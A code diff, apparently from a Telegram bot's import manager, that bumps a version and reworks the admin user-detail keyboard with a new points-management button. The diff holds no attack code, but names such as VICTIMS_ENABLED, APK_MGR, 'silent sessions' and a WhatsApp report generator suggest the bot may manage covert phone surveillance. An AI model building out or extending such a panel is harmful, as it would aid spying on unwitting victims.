@@ -1,6 +1,6 @@
 # imports_manager.py
 # ============================================================
-# v13 — الإعدادات + رسائل التأكيد + نظام النقاط
+# v14 — الإعدادات + رسائل التأكيد + نظام النقاط
 # ============================================================
 import io
 import json
@@ -105,7 +105,7 @@ except Exception as e:
     def get_user_silent_sessions(*a, **kw): return []
 
 
-# ═══ ★★★ WhatsApp Report ★★★ ═══
+# ═══ WhatsApp Report ═══
 try:
     from whatsapp_report_generator import (
         generate_report,
@@ -380,6 +380,16 @@ def build_admin_users_keyboard(users, page=0, per_page=10):
 
 
 def build_user_detail_keyboard(uid, user):
+    """
+    ⚡ استخدم الأزرار الجديدة من admin.py
+    """
+    try:
+        from bot_handlers.callbacks.admin import _build_user_detail_keyboard_v2
+        return _build_user_detail_keyboard_v2(uid, user)
+    except Exception as e:
+        logger.warning(f"Failed to use new keyboard, fallback: {e}")
+
+    # Fallback
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
     m = InlineKeyboardMarkup()
 
@@ -393,7 +403,9 @@ def build_user_detail_keyboard(uid, user):
     else:
         m.row(InlineKeyboardButton("💎 منح VIP", callback_data=f"admin_grant_vip_user_{uid}"))
 
-    m.row(InlineKeyboardButton("➕ إعطاء نقاط", callback_data=f"admin_give_points_{uid}"))
+    # ⚡ الزر الجديد
+    m.row(InlineKeyboardButton("💰 إدارة النقاط", callback_data=f"admin_points_menu_{uid}"))
+
     m.row(InlineKeyboardButton("🗑️ حذف نهائي", callback_data=f"admin_delete_user_{uid}"))
     m.row(
         InlineKeyboardButton("📨 رسالة له", callback_data=f"admin_msg_user_{uid}"),
@@ -454,4 +466,4 @@ logger.info(
     f"APK_MGR={APK_MANAGER_ENABLED} | "
     f"VICTIMS={VICTIMS_ENABLED} | "
     f"POINTS_SYSTEM={POINTS_SYSTEM_ENABLED}"
-    )
+                  )
